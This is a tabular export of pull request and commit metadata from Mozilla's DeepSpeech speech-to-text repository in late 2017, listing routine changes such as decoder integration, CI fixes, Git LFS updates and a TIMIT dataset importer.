3543,https://api.github.com/repos/mozilla/DeepSpeech/pulls/878,878,My client lm,,lissyx,1645737,2017-10-09T17:31:28Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,980c66b29c9ea2f9aaffe5977278768f36bf3d43,Add a proper name for the logits output in the graph and use it
3544,https://api.github.com/repos/mozilla/DeepSpeech/pulls/878,878,My client lm,,lissyx,1645737,2017-10-09T17:31:28Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f9ff38be1791290a9ffc1c09f4bad9361a90295,Benchmark with and without the new decoder
3545,https://api.github.com/repos/mozilla/DeepSpeech/pulls/878,878,My client lm,,lissyx,1645737,2017-10-09T17:31:28Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1ebcf4667b2ad766a143beeeb6b0e5e8560a347e,Only install Git LFS on the Linux test base
3546,https://api.github.com/repos/mozilla/DeepSpeech/pulls/878,878,My client lm,,lissyx,1645737,2017-10-09T17:31:28Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b9f9d0d229a2f03c9412f93250919d91e9aa669,Factor out feature number and context window size constants
3547,https://api.github.com/repos/mozilla/DeepSpeech/pulls/878,878,My client lm,,lissyx,1645737,2017-10-09T17:31:28Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3547ae3f7d34f16a595cfa1f4327e28afeafb660,Update to Git LFS 2.3.1
3548,https://api.github.com/repos/mozilla/DeepSpeech/pulls/878,878,My client lm,,lissyx,1645737,2017-10-09T17:31:28Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,23046a644b64915d95a2793c0ada66496f28e696,Get LM files from the source checkout instead of packaging them
3549,https://api.github.com/repos/mozilla/DeepSpeech/pulls/878,878,My client lm,,lissyx,1645737,2017-10-09T17:31:28Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ed17cc1cf8e9b56739bf6e5606400bdf500971a7,WIP: Debug
3550,https://api.github.com/repos/mozilla/DeepSpeech/pulls/877,877, Fix header in readme.md- #installation,"
Fix header in readme.md- #installation",CR1AT0RS,4299288,2017-10-08T08:12:33Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48ca6d8ada16a10c99eaf74322e6418ddd3c5e84,"Fix header in readme.md- #installation

Navigation name for header(#install) does not match (#installation)"
3551,https://api.github.com/repos/mozilla/DeepSpeech/pulls/877,877, Fix header in readme.md- #installation,"
Fix header in readme.md- #installation",CR1AT0RS,4299288,2017-10-08T08:12:33Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ba7c19db9582942118c13d4dbe1dc0924b014641,"Fix table of contents #installation header

Fix table of contents #installation header to match  change #install to# installation"
3552,https://api.github.com/repos/mozilla/DeepSpeech/pulls/875,875,Cleanup makefile,Fixes #874,lissyx,1645737,2017-10-06T09:31:29Z,COLLABORATOR,True,37,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42075082beef06b06c26577027833c68da75a7e7,"Cleanup makefile

Fixes #874"
3553,https://api.github.com/repos/mozilla/DeepSpeech/pulls/872,872,Proper call of calloc(),Fixes #868,lissyx,1645737,2017-10-05T07:35:13Z,COLLABORATOR,True,9,9,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fc50efa07fb5de673da7a173fc73c686e5142d08,"Proper call of calloc()

Fixes #868"
3554,https://api.github.com/repos/mozilla/DeepSpeech/pulls/869,869,adding images to the thumbnail of README.md file,adding images to the thumbnail of README.md file,ghost,10137,2017-10-04T19:57:56Z,NONE,False,3,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3245338bd411398902c4bc31b7f5e1a7641645c5,"adding images to the thumbnail of README.md file

adding images to the thumbnail of README.md file"
3555,https://api.github.com/repos/mozilla/DeepSpeech/pulls/866,866,Testing PR Update tc.py,PR to run TC tests,lissyx,1645737,2017-10-04T07:35:56Z,COLLABORATOR,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d42048078e2fa6b1329b8300162314797bc57398,"Update tc.py

Native_client file is in .tar.xz format so extracting with tar -xzvf will give error ""gzip: stdin: not in gzip format"""
3556,https://api.github.com/repos/mozilla/DeepSpeech/pulls/865,865,Fix gzip format error to uncompress tar.xz via tc.py,"Native_client file is in .tar.xz format so extracting with tar -xzvf will give error ""gzip: stdin: not in gzip format""",CR1AT0RS,4299288,2017-10-04T01:52:57Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bb72549297b55c78b05a4a926de41f03d58a9232,"Fix gzip format error to uncompress tar.xz via tc.py

Native_client file is in .tar.xz format so extracting with tar -xzvf will give error ""gzip: stdin: not in gzip format"""
3557,https://api.github.com/repos/mozilla/DeepSpeech/pulls/864,864,My clients decoder,Just for testing.,lissyx,1645737,2017-09-30T10:03:37Z,COLLABORATOR,False,312,213,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cfab5e70754dabaec624c2ecab9e2c1f7ed25b0e,Move beam scorer and beam state into a header file
3558,https://api.github.com/repos/mozilla/DeepSpeech/pulls/864,864,My clients decoder,Just for testing.,lissyx,1645737,2017-09-30T10:03:37Z,COLLABORATOR,False,312,213,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,02a75041aec1795fa8185fc43ee404dd89f96e72,Use the decoder with LM in the native clients
3559,https://api.github.com/repos/mozilla/DeepSpeech/pulls/864,864,My clients decoder,Just for testing.,lissyx,1645737,2017-09-30T10:03:37Z,COLLABORATOR,False,312,213,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e26ebb4731163c044414de0a0a1bae248267a940,Pass additional LM binary and trie parameters in client tests
3560,https://api.github.com/repos/mozilla/DeepSpeech/pulls/864,864,My clients decoder,Just for testing.,lissyx,1645737,2017-09-30T10:03:37Z,COLLABORATOR,False,312,213,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f515762090aac75a6817afd6fa04c7237127e39,Make sure Git LFS is installed across all contexts in tests
3561,https://api.github.com/repos/mozilla/DeepSpeech/pulls/857,857,Fix TaskCluster branch filtering,,lissyx,1645737,2017-09-28T06:24:01Z,COLLABORATOR,True,3,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa03bdaddcfa8dd36072da472bef9c800c6c71cc,"Enable TaskCluster branch-filtering

Fixes #861"
3562,https://api.github.com/repos/mozilla/DeepSpeech/pulls/856,856,Make sure we use the new decoder in the native clients,,reuben,477142,2017-09-27T19:10:24Z,MEMBER,True,432,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cfab5e70754dabaec624c2ecab9e2c1f7ed25b0e,Move beam scorer and beam state into a header file
3563,https://api.github.com/repos/mozilla/DeepSpeech/pulls/856,856,Make sure we use the new decoder in the native clients,,reuben,477142,2017-09-27T19:10:24Z,MEMBER,True,432,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,02a75041aec1795fa8185fc43ee404dd89f96e72,Use the decoder with LM in the native clients
3564,https://api.github.com/repos/mozilla/DeepSpeech/pulls/856,856,Make sure we use the new decoder in the native clients,,reuben,477142,2017-09-27T19:10:24Z,MEMBER,True,432,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,adfe5e77d9671d88e489f3be9429cbbff3947380,Pass additional LM binary and trie parameters in client tests
3565,https://api.github.com/repos/mozilla/DeepSpeech/pulls/856,856,Make sure we use the new decoder in the native clients,,reuben,477142,2017-09-27T19:10:24Z,MEMBER,True,432,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,033d4f765a85323c4753db3ab06219736965340a,Make sure Git LFS is installed across all contexts in tests
3566,https://api.github.com/repos/mozilla/DeepSpeech/pulls/856,856,Make sure we use the new decoder in the native clients,,reuben,477142,2017-09-27T19:10:24Z,MEMBER,True,432,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8b059c62354ce231b05fdbaf6a0d51d14882f60,Make the new decoder optional
3567,https://api.github.com/repos/mozilla/DeepSpeech/pulls/856,856,Make sure we use the new decoder in the native clients,,reuben,477142,2017-09-27T19:10:24Z,MEMBER,True,432,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,980c66b29c9ea2f9aaffe5977278768f36bf3d43,Add a proper name for the logits output in the graph and use it
3568,https://api.github.com/repos/mozilla/DeepSpeech/pulls/856,856,Make sure we use the new decoder in the native clients,,reuben,477142,2017-09-27T19:10:24Z,MEMBER,True,432,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3623e8bf69f508c60ddc2cafef0936d1ea17e59f,Benchmark with and without the new decoder
3569,https://api.github.com/repos/mozilla/DeepSpeech/pulls/856,856,Make sure we use the new decoder in the native clients,,reuben,477142,2017-09-27T19:10:24Z,MEMBER,True,432,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a6dbbfdc50dc8638b777af2b5fd474fbde39aced,Only install Git LFS on the Linux test base
3570,https://api.github.com/repos/mozilla/DeepSpeech/pulls/856,856,Make sure we use the new decoder in the native clients,,reuben,477142,2017-09-27T19:10:24Z,MEMBER,True,432,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ef544dabd8234eb0b16e786e341eadfa962c17e7,Factor out feature number and context window size constants
3571,https://api.github.com/repos/mozilla/DeepSpeech/pulls/856,856,Make sure we use the new decoder in the native clients,,reuben,477142,2017-09-27T19:10:24Z,MEMBER,True,432,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,87c9be1097ec4082121fd56e22018d80342d499d,Update to Git LFS 2.3.1
3572,https://api.github.com/repos/mozilla/DeepSpeech/pulls/856,856,Make sure we use the new decoder in the native clients,,reuben,477142,2017-09-27T19:10:24Z,MEMBER,True,432,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,01fae0eee12ac150fbd0f0d69eace0feef049de1,Get LM files from the source checkout instead of packaging them
3573,https://api.github.com/repos/mozilla/DeepSpeech/pulls/854,854,Fix handling of Unicode messages when using custom alphabets (Fixes #849),"We can either check if we're running on Python 2 or 3 every time we call `str` (so that we can call `unicode` instead on Python 3, or just avoid calling either one. This doesn't fix some obscure cases like non-ASCII characters in exception messages, but it works on both Python 2 and 3, with and without non-ASCII characters in the alphabet and training data.",reuben,477142,2017-09-26T17:25:15Z,MEMBER,True,15,16,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9c338b76dba4f8816f129e0c5219aacace93b022,Fix handling of Unicode messages when using custom alphabets (Fixes #849)
3574,https://api.github.com/repos/mozilla/DeepSpeech/pulls/853,853,Change all path on OSX after extracting home.tar.xz,Fixes #852,lissyx,1645737,2017-09-25T18:15:47Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,26a9c3e45ef5ec8dc8daa718ac6fd1c2eac977a5,"Change all path on OSX after extracting home.tar.xz

Fixes #852"
3575,https://api.github.com/repos/mozilla/DeepSpeech/pulls/842,842,Tc light worker type,,lissyx,1645737,2017-09-19T18:44:08Z,COLLABORATOR,True,93,10,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ffb95a2ef11ebceb9cca54635e928b697615486e,Switch TaskCluster provisioner/workerType for OSX
3576,https://api.github.com/repos/mozilla/DeepSpeech/pulls/841,841,Set proper artifacts expiration dates,Fixes #840,lissyx,1645737,2017-09-19T14:20:38Z,COLLABORATOR,True,8,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c74448fbdd5eed0c26253e5dc8f06bd11c32d5bf,"Set proper artifacts expiration dates

Fixes #840"
3577,https://api.github.com/repos/mozilla/DeepSpeech/pulls/834,834,TaskCluster Decision Task,,lissyx,1645737,2017-09-18T11:08:50Z,COLLABORATOR,True,462,663,29,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,31616daf0267779c0cb1a3d8d06499329e8bf2e2,"TaskCluster Decision Task

Fixes #837"
3578,https://api.github.com/repos/mozilla/DeepSpeech/pulls/830,830,Quantize aot rebase,Still WIP obviously :),lissyx,1645737,2017-09-14T12:03:59Z,COLLABORATOR,False,1014,123,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a39684618f7ead5b9d534f8cf1719e8c44badbbb,"WIP: Quantization of model

Fixes #133"
3579,https://api.github.com/repos/mozilla/DeepSpeech/pulls/830,830,Quantize aot rebase,Still WIP obviously :),lissyx,1645737,2017-09-14T12:03:59Z,COLLABORATOR,False,1014,123,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32f9e06578c40b1c0f7b38aba4cf99eeb8090e36,WIP: Tooling for slow 8-bits investigation
3580,https://api.github.com/repos/mozilla/DeepSpeech/pulls/830,830,Quantize aot rebase,Still WIP obviously :),lissyx,1645737,2017-09-14T12:03:59Z,COLLABORATOR,False,1014,123,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7418411fb46c4382203cdf78e4faa074fa0c1a90,WIP: Hacking with AOT/tfcompile
3581,https://api.github.com/repos/mozilla/DeepSpeech/pulls/829,829,Enumerate targets explicitly to workaround macOS strip bug in bazel,,reuben,477142,2017-09-13T22:31:02Z,MEMBER,True,4,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,323678466d230c25f427dc71ed21a6908ccfadfd,Enumerate targets explicitly to workaround macOS strip bug in bazel
3582,https://api.github.com/repos/mozilla/DeepSpeech/pulls/826,826,fixing typos,fixing typos,ghost,10137,2017-09-11T21:09:25Z,NONE,False,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,54e61b929ebce54c61a15a6566f0eefdf391f895,"fixing typos

fixing typos"
3583,https://api.github.com/repos/mozilla/DeepSpeech/pulls/825,825,Import TIMIT dataset,"Hi,

I created a TIMIT preparation script for everything (excluding the download, as it's LDC). It was one of the few, very well used, paid LDC datasets that I had at my disposal. It's only small, with around 5 hours worth of audio and has 630 speakers with 10 types of specially crafted sentences, designed to test ASR systems. 

""The TIMIT corpus of read speech is designed to provide speech data for acoustic-phonetic studies and for the development and evaluation of automatic speech recognition systems. TIMIT contains broadband recordings of 630 speakers of eight major dialects of American English, each reading ten phonetically rich sentences. The TIMIT corpus includes time-aligned orthographic, phonetic and word transcriptions as well as a 16-bit, 16kHz speech waveform file for each utterance.""

More details, such as sentence distribution/gender, can be found [here](https://catalog.ldc.upenn.edu/ldc93s1). Traditionally papers have compared PER using TIMIT but there's no reason why WER cannot be compared also.

**What's included in this PR?**
1. import_timit.py - extracts, processes and outputs the required train/test CSV files 
2. run-timit.sh - will run TIMIT with basic defaults (similarly to the other run scripts)

**Has it been tested?**
Yes - I have tested with Ubuntu 16.04 using python 2.7. It extracts, preprocesses builds the CSVs and runs as expected. 
",robmsmt,16005758,2017-09-11T18:39:42Z,CONTRIBUTOR,True,172,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f180697eddde0a82dcb3c169b6e66aa4ac060706,"Merge pull request #1 from mozilla/master

m"
3584,https://api.github.com/repos/mozilla/DeepSpeech/pulls/825,825,Import TIMIT dataset,"Hi,

I created a TIMIT preparation script for everything (excluding the download, as it's LDC). It was one of the few, very well used, paid LDC datasets that I had at my disposal. It's only small, with around 5 hours worth of audio and has 630 speakers with 10 types of specially crafted sentences, designed to test ASR systems. 

""The TIMIT corpus of read speech is designed to provide speech data for acoustic-phonetic studies and for the development and evaluation of automatic speech recognition systems. TIMIT contains broadband recordings of 630 speakers of eight major dialects of American English, each reading ten phonetically rich sentences. The TIMIT corpus includes time-aligned orthographic, phonetic and word transcriptions as well as a 16-bit, 16kHz speech waveform file for each utterance.""

More details, such as sentence distribution/gender, can be found [here](https://catalog.ldc.upenn.edu/ldc93s1). Traditionally papers have compared PER using TIMIT but there's no reason why WER cannot be compared also.

**What's included in this PR?**
1. import_timit.py - extracts, processes and outputs the required train/test CSV files 
2. run-timit.sh - will run TIMIT with basic defaults (similarly to the other run scripts)

**Has it been tested?**
Yes - I have tested with Ubuntu 16.04 using python 2.7. It extracts, preprocesses builds the CSVs and runs as expected. 
",robmsmt,16005758,2017-09-11T18:39:42Z,CONTRIBUTOR,True,172,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4fc73f0abe4cfcd8b38a112647e5e0f525bf3f5c,added timit import scripts
3585,https://api.github.com/repos/mozilla/DeepSpeech/pulls/825,825,Import TIMIT dataset,"Hi,

I created a TIMIT preparation script for everything (excluding the download, as it's LDC). It was one of the few, very well used, paid LDC datasets that I had at my disposal. It's only small, with around 5 hours worth of audio and has 630 speakers with 10 types of specially crafted sentences, designed to test ASR systems. 

""The TIMIT corpus of read speech is designed to provide speech data for acoustic-phonetic studies and for the development and evaluation of automatic speech recognition systems. TIMIT contains broadband recordings of 630 speakers of eight major dialects of American English, each reading ten phonetically rich sentences. The TIMIT corpus includes time-aligned orthographic, phonetic and word transcriptions as well as a 16-bit, 16kHz speech waveform file for each utterance.""

More details, such as sentence distribution/gender, can be found [here](https://catalog.ldc.upenn.edu/ldc93s1). Traditionally papers have compared PER using TIMIT but there's no reason why WER cannot be compared also.

**What's included in this PR?**
1. import_timit.py - extracts, processes and outputs the required train/test CSV files 
2. run-timit.sh - will run TIMIT with basic defaults (similarly to the other run scripts)

**Has it been tested?**
Yes - I have tested with Ubuntu 16.04 using python 2.7. It extracts, preprocesses builds the CSVs and runs as expected. 
",robmsmt,16005758,2017-09-11T18:39:42Z,CONTRIBUTOR,True,172,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1206e1835783d1c5dc380f68296efa5f09547c32,"Merge pull request #2 from mozilla/master

merge"
3586,https://api.github.com/repos/mozilla/DeepSpeech/pulls/825,825,Import TIMIT dataset,"Hi,

I created a TIMIT preparation script for everything (excluding the download, as it's LDC). It was one of the few, very well used, paid LDC datasets that I had at my disposal. It's only small, with around 5 hours worth of audio and has 630 speakers with 10 types of specially crafted sentences, designed to test ASR systems. 

""The TIMIT corpus of read speech is designed to provide speech data for acoustic-phonetic studies and for the development and evaluation of automatic speech recognition systems. TIMIT contains broadband recordings of 630 speakers of eight major dialects of American English, each reading ten phonetically rich sentences. The TIMIT corpus includes time-aligned orthographic, phonetic and word transcriptions as well as a 16-bit, 16kHz speech waveform file for each utterance.""

More details, such as sentence distribution/gender, can be found [here](https://catalog.ldc.upenn.edu/ldc93s1). Traditionally papers have compared PER using TIMIT but there's no reason why WER cannot be compared also.

**What's included in this PR?**
1. import_timit.py - extracts, processes and outputs the required train/test CSV files 
2. run-timit.sh - will run TIMIT with basic defaults (similarly to the other run scripts)

**Has it been tested?**
Yes - I have tested with Ubuntu 16.04 using python 2.7. It extracts, preprocesses builds the CSVs and runs as expected. 
",robmsmt,16005758,2017-09-11T18:39:42Z,CONTRIBUTOR,True,172,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fad7f79956b3bcef17932e715adcf8313c28673b,Merge branch 'master' of https://github.com/mlrobsmt/DeepSpeech into import_timit
3587,https://api.github.com/repos/mozilla/DeepSpeech/pulls/825,825,Import TIMIT dataset,"Hi,

I created a TIMIT preparation script for everything (excluding the download, as it's LDC). It was one of the few, very well used, paid LDC datasets that I had at my disposal. It's only small, with around 5 hours worth of audio and has 630 speakers with 10 types of specially crafted sentences, designed to test ASR systems. 

""The TIMIT corpus of read speech is designed to provide speech data for acoustic-phonetic studies and for the development and evaluation of automatic speech recognition systems. TIMIT contains broadband recordings of 630 speakers of eight major dialects of American English, each reading ten phonetically rich sentences. The TIMIT corpus includes time-aligned orthographic, phonetic and word transcriptions as well as a 16-bit, 16kHz speech waveform file for each utterance.""

More details, such as sentence distribution/gender, can be found [here](https://catalog.ldc.upenn.edu/ldc93s1). Traditionally papers have compared PER using TIMIT but there's no reason why WER cannot be compared also.

**What's included in this PR?**
1. import_timit.py - extracts, processes and outputs the required train/test CSV files 
2. run-timit.sh - will run TIMIT with basic defaults (similarly to the other run scripts)

**Has it been tested?**
Yes - I have tested with Ubuntu 16.04 using python 2.7. It extracts, preprocesses builds the CSVs and runs as expected. 
",robmsmt,16005758,2017-09-11T18:39:42Z,CONTRIBUTOR,True,172,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c96d57d938583e2cf3078b1ef5f038c8494d415,formatting
3588,https://api.github.com/repos/mozilla/DeepSpeech/pulls/825,825,Import TIMIT dataset,"Hi,

I created a TIMIT preparation script for everything (excluding the download, as it's LDC). It was one of the few, very well used, paid LDC datasets that I had at my disposal. It's only small, with around 5 hours worth of audio and has 630 speakers with 10 types of specially crafted sentences, designed to test ASR systems. 

""The TIMIT corpus of read speech is designed to provide speech data for acoustic-phonetic studies and for the development and evaluation of automatic speech recognition systems. TIMIT contains broadband recordings of 630 speakers of eight major dialects of American English, each reading ten phonetically rich sentences. The TIMIT corpus includes time-aligned orthographic, phonetic and word transcriptions as well as a 16-bit, 16kHz speech waveform file for each utterance.""

More details, such as sentence distribution/gender, can be found [here](https://catalog.ldc.upenn.edu/ldc93s1). Traditionally papers have compared PER using TIMIT but there's no reason why WER cannot be compared also.

**What's included in this PR?**
1. import_timit.py - extracts, processes and outputs the required train/test CSV files 
2. run-timit.sh - will run TIMIT with basic defaults (similarly to the other run scripts)

**Has it been tested?**
Yes - I have tested with Ubuntu 16.04 using python 2.7. It extracts, preprocesses builds the CSVs and runs as expected. 
",robmsmt,16005758,2017-09-11T18:39:42Z,CONTRIBUTOR,True,172,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,147597b3812b2f962696046c52a4391220058e31,added SA sentence switch
3589,https://api.github.com/repos/mozilla/DeepSpeech/pulls/825,825,Import TIMIT dataset,"Hi,

I created a TIMIT preparation script for everything (excluding the download, as it's LDC). It was one of the few, very well used, paid LDC datasets that I had at my disposal. It's only small, with around 5 hours worth of audio and has 630 speakers with 10 types of specially crafted sentences, designed to test ASR systems. 

""The TIMIT corpus of read speech is designed to provide speech data for acoustic-phonetic studies and for the development and evaluation of automatic speech recognition systems. TIMIT contains broadband recordings of 630 speakers of eight major dialects of American English, each reading ten phonetically rich sentences. The TIMIT corpus includes time-aligned orthographic, phonetic and word transcriptions as well as a 16-bit, 16kHz speech waveform file for each utterance.""

More details, such as sentence distribution/gender, can be found [here](https://catalog.ldc.upenn.edu/ldc93s1). Traditionally papers have compared PER using TIMIT but there's no reason why WER cannot be compared also.

**What's included in this PR?**
1. import_timit.py - extracts, processes and outputs the required train/test CSV files 
2. run-timit.sh - will run TIMIT with basic defaults (similarly to the other run scripts)

**Has it been tested?**
Yes - I have tested with Ubuntu 16.04 using python 2.7. It extracts, preprocesses builds the CSVs and runs as expected. 
",robmsmt,16005758,2017-09-11T18:39:42Z,CONTRIBUTOR,True,172,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f22c6f21294928ce8ac98f56890d5044134b1f6,removed blank
3590,https://api.github.com/repos/mozilla/DeepSpeech/pulls/824,824,Merge pull request #1 from mozilla/master,m,robmsmt,16005758,2017-09-11T16:30:11Z,CONTRIBUTOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f180697eddde0a82dcb3c169b6e66aa4ac060706,"Merge pull request #1 from mozilla/master

m"
3591,https://api.github.com/repos/mozilla/DeepSpeech/pulls/823,823,Out of Date SWB merge,,robmsmt,16005758,2017-09-08T16:18:35Z,CONTRIBUTOR,False,3,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,847c841261c68fefca35e032fd41ebcfa4a5e48f,"Merge pull request #1 from mozilla/master

update"
3592,https://api.github.com/repos/mozilla/DeepSpeech/pulls/823,823,Out of Date SWB merge,,robmsmt,16005758,2017-09-08T16:18:35Z,CONTRIBUTOR,False,3,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd31bb8d4f5d3e18b97702dd6f879d900a3e4eca,"return statement error

in python3 got an error on this, can either put it all on one line or wrap it bracket"
3593,https://api.github.com/repos/mozilla/DeepSpeech/pulls/820,820,Issue818+819,,lissyx,1645737,2017-09-07T11:49:24Z,COLLABORATOR,True,16,20,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2a71ecb11dd23407471eb7807e326185d753d9a8,"Remove brew install use and cleanup npm usage

Fixes #819"
3594,https://api.github.com/repos/mozilla/DeepSpeech/pulls/817,817,Fix #360; Compare SortaGrad vs Existing Curriculum Learning,,liuguangyuan,7778127,2017-09-06T06:11:26Z,NONE,False,20,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6d8b85c05b2026d3ebf05306b2fe1b05581dc027,Fix #360; Compare SortaGrad vs Existing Curriculum Learning
3595,https://api.github.com/repos/mozilla/DeepSpeech/pulls/816,816,Issue760,,liuguangyuan,7778127,2017-09-06T06:10:25Z,NONE,False,23,18,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e3c47b254e1673dde31198c760deaadfb92333eb,Fixed #759
3596,https://api.github.com/repos/mozilla/DeepSpeech/pulls/816,816,Issue760,,liuguangyuan,7778127,2017-09-06T06:10:25Z,NONE,False,23,18,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de8456276ddde126474ef7e80acaacfa255ee6d0,Moved namespace
